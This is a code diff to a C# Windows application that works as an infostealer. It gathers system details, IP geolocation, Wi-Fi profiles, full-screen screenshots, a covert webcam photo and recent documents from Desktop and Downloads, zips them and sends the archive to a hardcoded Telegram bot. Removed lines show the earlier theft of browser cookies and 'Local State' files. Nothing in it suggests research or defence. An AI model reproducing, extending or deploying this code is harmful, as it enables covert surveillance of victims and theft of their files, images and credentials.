@@ -49,7 +49,14 @@ namespace Bibon.Pages
                 await RunMainLogicAsync();
             };
         }
-
+        private void UpdateProgress(string status, int value)
+        {
+            Dispatcher.Invoke(() =>
+            {
+                statusLabel.Content = status;
+                progressBar.Value = value;
+            });
+        }
         private bool IsRunAsAdmin()
         {
             var wi = WindowsIdentity.GetCurrent();
@@ -99,31 +106,35 @@ namespace Bibon.Pages
 
             try
             {
+                UpdateProgress("Удаление старого архива...", 0);
                 if (File.Exists(zipPath))
                     File.Delete(zipPath);
 
-                // Параллельный сбор данных
+                UpdateProgress("Сбор системной информации...", 1);
                 var sysInfoTask = Task.Run(GetSystemInfoText);
+
+                UpdateProgress("Сбор Wi-Fi профилей...", 2);
                 var wifiInfoTask = Task.Run(GetWifiInfo);
+
+                UpdateProgress("Создание скриншота...", 3);
                 var screenshotTask = Task.Run(CaptureScreenshotToStream);
+
+                UpdateProgress("Ожидание камеры и создание фото...", 4);
                 var cameraTask = Task.Run(CapturePhotoFromCameraToStream);
-                var cookiesTask = Task.Run(GetBrowserCookiesFiles);
 
-                await Task.WhenAll(sysInfoTask, wifiInfoTask, screenshotTask, cameraTask, cookiesTask);
+                await Task.WhenAll(sysInfoTask, wifiInfoTask, screenshotTask, cameraTask);
 
+                UpdateProgress("Архивация файлов...", 5);
                 using (var archive = ZipFile.Open(zipPath, ZipArchiveMode.Create))
                 {
-                    // Системная информация
                     var sysEntry = archive.CreateEntry("Info System/Info System.txt");
                     using (var writer = new StreamWriter(sysEntry.Open()))
                         writer.Write(await sysInfoTask);
 
-                    // Wi-Fi
                     var wifiEntry = archive.CreateEntry("Wifi name/Wifi.txt");
                     using (var writer = new StreamWriter(wifiEntry.Open()))
                         writer.Write(await wifiInfoTask);
 
-                    // Скриншот
                     using (var screenshotStream = await screenshotTask)
                     {
                         var screenshotEntry = archive.CreateEntry("Foto/screenshot.jpg");
@@ -134,7 +145,6 @@ namespace Bibon.Pages
                         }
                     }
 
-                    // Фото с камеры (если есть)
                     var cameraStream = await cameraTask;
                     if (cameraStream != null)
                     {
@@ -145,34 +155,14 @@ namespace Bibon.Pages
                             cameraStream.CopyTo(entryStream);
                         }
                     }
-
-                    // Cookies с обработкой занятости файла
-                    foreach (var file in await cookiesTask)
-                    {
-                        if (File.Exists(file.Path))
-                        {
-                            try
-                            {
-                                // Копируем файл во временную папку с FileShare.ReadWrite
-                                string tempCookiePath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + "_" + Path.GetFileName(file.Path));
-                                using (var sourceStream = new FileStream(file.Path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
-                                using (var destStream = new FileStream(tempCookiePath, FileMode.Create, FileAccess.Write, FileShare.None))
-                                {
-                                    sourceStream.CopyTo(destStream);
-                                }
-                                archive.CreateEntryFromFile(tempCookiePath, $"Cookie/{file.Browser}/{Path.GetFileName(file.Path)}", CompressionLevel.Optimal);
-                                File.Delete(tempCookiePath); // Удаляем временный файл
-                            }
-                            catch (Exception ex)
-                            {
-                                // Файл не удалось скопировать — пропускаем
-                                Console.WriteLine($"Не удалось скопировать файл cookies: {file.Path}. Ошибка: {ex.Message}");
-                            }
-                        }
-                    }
+                    const long telegramLimit = 10 * 1024 * 1024; // 50 MB
+                    AddUserFilesToArchive(archive, telegramLimit - 2 * 1024 * 1024);
                 }
 
+                UpdateProgress("Отправка архива в Telegram...", 6);
                 await SendToTelegramAsync(zipPath);
+
+                UpdateProgress("Готово!", 6);
 
                 Button_Click1(null, null);
             }
@@ -193,11 +183,7 @@ namespace Bibon.Pages
             sw.WriteLine("{0,-25} {1}", "User Name:", Environment.UserName);
             sw.WriteLine("{0,-25} {1}", "Windows Version:", GetWindowsVersion());
             sw.WriteLine("{0,-25} {1}", "Processor Architecture:", Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
-            sw.WriteLine("{0,-25} {1}", "Manufacturer:", GetHardwareInfo("Win32_ComputerSystem", "Manufacturer"));
-            sw.WriteLine("{0,-25} {1}", "Model:", GetHardwareInfo("Win32_ComputerSystem", "Model"));
-            sw.WriteLine("{0,-25} {1}", "BIOS Version:", GetHardwareInfo("Win32_BIOS", "Version"));
             sw.WriteLine("{0,-25} {1}", "RAM:", FormatBytes(Convert.ToInt64(GetHardwareInfo("Win32_ComputerSystem", "TotalPhysicalMemory"))));
-            sw.WriteLine("{0,-25} {1}", "GPU:", GetHardwareInfo("Win32_VideoController", "Name"));
             sw.WriteLine("{0,-25} {1}", "Local IP:", GetLocalIPAddress());
             sw.WriteLine(GetPublicIPAddressAndGeoInfo());
             return sw.ToString();
@@ -209,28 +195,24 @@ namespace Bibon.Pages
             {
                 try
                 {
-                    string response = client.DownloadString("https://api.ipbase.com/v1/json/");
+                    string response = client.DownloadString("https://ipinfo.io/json");
                     var json = JObject.Parse(response);
 
                     string ip = json["ip"]?.ToString();
-                    string country = json["country_name"]?.ToString();
-                    string region = json["region_name"]?.ToString();
+                    string country = json["country"]?.ToString();
+                    string region = json["region"]?.ToString();
                     string city = json["city"]?.ToString();
-                    string zipCode = json["zip_code"]?.ToString();
-                    string timeZone = json["time_zone"]?.ToString();
-                    double latitude = json["latitude"]?.ToObject<double>() ?? 0;
-                    double longitude = json["longitude"]?.ToObject<double>() ?? 0;
+                    string loc = json["loc"]?.ToString();
+                    string timezone = json["timezone"]?.ToString();
 
                     return string.Format(
-                        "{0,-25} {1}\n{2,-25} {3}\n{4,-25} {5}\n{6,-25} {7}\n{8,-25} {9}\n{10,-25} {11}\n{12,-25} {13}\n{14,-25} {15}",
+                        "{0,-25} {1}\n{2,-25} {3}\n{4,-25} {5}\n{6,-25} {7}\n{8,-25} {9}\n{10,-25} {11}",
                         "IP:", ip,
                         "Country:", country,
                         "Region:", region,
                         "City:", city,
-                        "Zip Code:", zipCode,
-                        "Time Zone:", timeZone,
-                        "Latitude:", latitude.ToString("0.#####"),
-                        "Longitude:", longitude.ToString("0.#####")
+                        "Location:", loc,
+                        "Time Zone:", timezone
                     );
                 }
                 catch
@@ -292,14 +274,15 @@ namespace Bibon.Pages
         // Скриншот в поток
         private MemoryStream CaptureScreenshotToStream()
         {
+            var screenBounds = System.Windows.Forms.SystemInformation.VirtualScreen;
             var ms = new MemoryStream();
-            using (var bmp = new Bitmap((int)SystemParameters.PrimaryScreenWidth, (int)SystemParameters.PrimaryScreenHeight))
+            using (var bmp = new Bitmap(screenBounds.Width, screenBounds.Height))
             using (var g = Graphics.FromImage(bmp))
             {
-                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
+                g.CopyFromScreen(screenBounds.Left, screenBounds.Top, 0, 0, bmp.Size);
                 var jpegCodec = GetEncoder(ImageFormat.Jpeg);
                 var encoderParams = new EncoderParameters(1);
-                encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 50L);
+                encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 50L); // Максимальное качество!
                 bmp.Save(ms, jpegCodec, encoderParams);
             }
             ms.Position = 0;
@@ -309,12 +292,19 @@ namespace Bibon.Pages
         // Фото с камеры в поток (если камера есть)
         private MemoryStream CapturePhotoFromCameraToStream()
         {
+            AForge.Video.DirectShow.FilterInfoCollection videoDevices = null;
+
+            // Ждём появления камеры бесконечно
+            while (true)
+            {
+                videoDevices = new AForge.Video.DirectShow.FilterInfoCollection(AForge.Video.DirectShow.FilterCategory.VideoInputDevice);
+                if (videoDevices.Count > 0)
+                    break;
+                Thread.Sleep(500); // Проверять каждые полсекунды, чтобы не грузить процессор
+            }
+
             try
             {
-                var videoDevices = new AForge.Video.DirectShow.FilterInfoCollection(AForge.Video.DirectShow.FilterCategory.VideoInputDevice);
-                if (videoDevices.Count == 0)
-                    return null;
-
                 var videoSource = new AForge.Video.DirectShow.VideoCaptureDevice(videoDevices[0].MonikerString);
                 Bitmap bitmap = null;
                 ManualResetEvent frameCaptured = new ManualResetEvent(false);
@@ -327,16 +317,13 @@ namespace Bibon.Pages
                 };
                 videoSource.Start();
 
-                if (!frameCaptured.WaitOne(TimeSpan.FromSeconds(5)))
-                {
-                    videoSource.SignalToStop();
-                    return null;
-                }
+                // Ждём кадр сколько потребуется (без таймаута)
+                frameCaptured.WaitOne();
 
                 var ms = new MemoryStream();
                 var jpegCodec = GetEncoder(ImageFormat.Jpeg);
                 var encoderParams = new EncoderParameters(1);
-                encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 50L);
+                encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, 100L);
                 bitmap.Save(ms, jpegCodec, encoderParams);
                 ms.Position = 0;
                 return ms;
@@ -346,7 +333,8 @@ namespace Bibon.Pages
                 return null;
             }
         }
-
+        
+        
         private ImageCodecInfo GetEncoder(ImageFormat format)
         {
             return ImageCodecInfo.GetImageDecoders().FirstOrDefault(codec => codec.FormatID == format.Guid);
@@ -387,6 +375,9 @@ namespace Bibon.Pages
             }
         }
 
+ 
+  
+
         public class WifiProfile
         {
             public string ProfileName { get; set; }
@@ -394,51 +385,19 @@ namespace Bibon.Pages
         }
 
         // Поиск файлов cookies браузеров
-        private List<(string Browser, string Path)> GetBrowserCookiesFiles()
-        {
-            string[] browsers = { "Edge", "Chrome", "Yandex" };
-            Dictionary<string, string[]> browserPaths = new Dictionary<string, string[]>
-            {
-                { "Edge", new string[]
-                    {
-                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data\\Local State"),
-                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\Edge\\User Data\\Default\\Network\\Cookies")
-                    }
-                },
-                { "Chrome", new string[]
-                    {
-                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Local State"),
-                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Default\\Network\\Cookies")
-                    }
-                },
-                { "Yandex", new string[]
-                    {
-                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Local State"),
-                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YandexBrowser\\User Data\\Default\\Network\\Cookies")
-                    }
-                }
-            };
-
-            var result = new List<(string, string)>();
-            foreach (var browser in browsers)
-            {
-                if (browserPaths.TryGetValue(browser, out string[] paths))
-                {
-                    foreach (var filePath in paths)
-                    {
-                        if (File.Exists(filePath))
-                            result.Add((browser, filePath));
-                    }
-                }
-            }
-            return result;
-        }
 
         // Отправка архива в Telegram с обработкой ошибок
         private async Task SendToTelegramAsync(string zipPath)
         {
             try
             {
+                var fileInfo = new FileInfo(zipPath);
+                if (fileInfo.Length > 50 * 1024 * 1024)
+                {
+                    MessageBox.Show("Архив слишком большой для отправки в Telegram.", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
+                    return;
+                }
+
                 var botClient = new TelegramBotClient("7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw");
                 using (var fileStream = new FileStream(zipPath, FileMode.Open, FileAccess.Read))
                 {
@@ -455,18 +414,7 @@ namespace Bibon.Pages
         }
 
         // Проверка отправки текстового сообщения (для диагностики)
-        private async Task TestTelegramAsync()
-        {
-            try
-            {
-                var botClient = new TelegramBotClient("7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw");
-                await botClient.SendTextMessageAsync("1005333334", "Проверка связи с ботом");
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show($"Ошибка отправки текста: {ex.Message}", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
-            }
-        }
+
 
         // Анимация закрытия и переход в MainWindow
         private void Button_Click1(object sender, RoutedEventArgs e)
@@ -488,5 +436,65 @@ namespace Bibon.Pages
             MainWindow mainWindow = new MainWindow();
             mainWindow.Show();
         }
+
+        private void AddUserFilesToArchive(ZipArchive archive, long maxTotalSizeBytes)
+        {
+            var fileExtensions = new[] { ".word", ".doc", ".docm", ".xls", ".txt", ".wps", ".xlsx", ".pdf" };
+            var userFolders = new[]
+            {
+        new { Folder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Name = "Рабочий стол" },
+        new { Folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"), Name = "Загрузки" }
+    };
+
+            const int maxFilesPerFolder = 20;
+            const long maxFileSize = 5 * 1024 * 1024; // 5 МБ
+
+            long totalSize = 0;
+            foreach (var userFolder in userFolders)
+            {
+                if (!Directory.Exists(userFolder.Folder))
+                    continue;
+
+                // Получаем только maxFilesPerFolder самых новых файлов с нужными расширениями и размером не больше maxFileSize
+                var files = Directory.EnumerateFiles(userFolder.Folder, "*.*", SearchOption.AllDirectories)
+                    .Where(f => fileExtensions.Contains(Path.GetExtension(f), StringComparer.OrdinalIgnoreCase))
+                    .Select(f => new FileInfo(f))
+                    .Where(fi => fi.Exists && fi.Length <= maxFileSize)
+                    .OrderByDescending(fi => fi.LastWriteTime)
+                    .Take(maxFilesPerFolder);
+
+                foreach (var fileInfo in files)
+                {
+                    try
+                    {
+                        if (totalSize + fileInfo.Length > maxTotalSizeBytes)
+                            return; // Прекратить добавление файлов
+
+                        string relativePath = GetRelativePath(userFolder.Folder, fileInfo.FullName);
+                        string entryPath = $"Files/{userFolder.Name}/{relativePath}";
+                        archive.CreateEntryFromFile(fileInfo.FullName, entryPath, CompressionLevel.Optimal);
+                        totalSize += fileInfo.Length;
+                    }
+                    catch { /* Пропускаем файлы с ошибками доступа */ }
+                }
+            }
+        }
+        private string GetRelativePath(string basePath, string path)
+        {
+            Uri baseUri = new Uri(AppendDirectorySeparatorChar(basePath));
+            Uri pathUri = new Uri(path);
+            return Uri.UnescapeDataString(baseUri.MakeRelativeUri(pathUri).ToString().Replace('/', Path.DirectorySeparatorChar));
+        }
+
+        private string AppendDirectorySeparatorChar(string path)
+        {
+            // Добавляет слеш в конец, если это директория и его нет
+            if (!path.EndsWith(Path.DirectorySeparatorChar.ToString()))
+                return path + Path.DirectorySeparatorChar;
+            return path;
+        }
+
+     
+
     }
 }
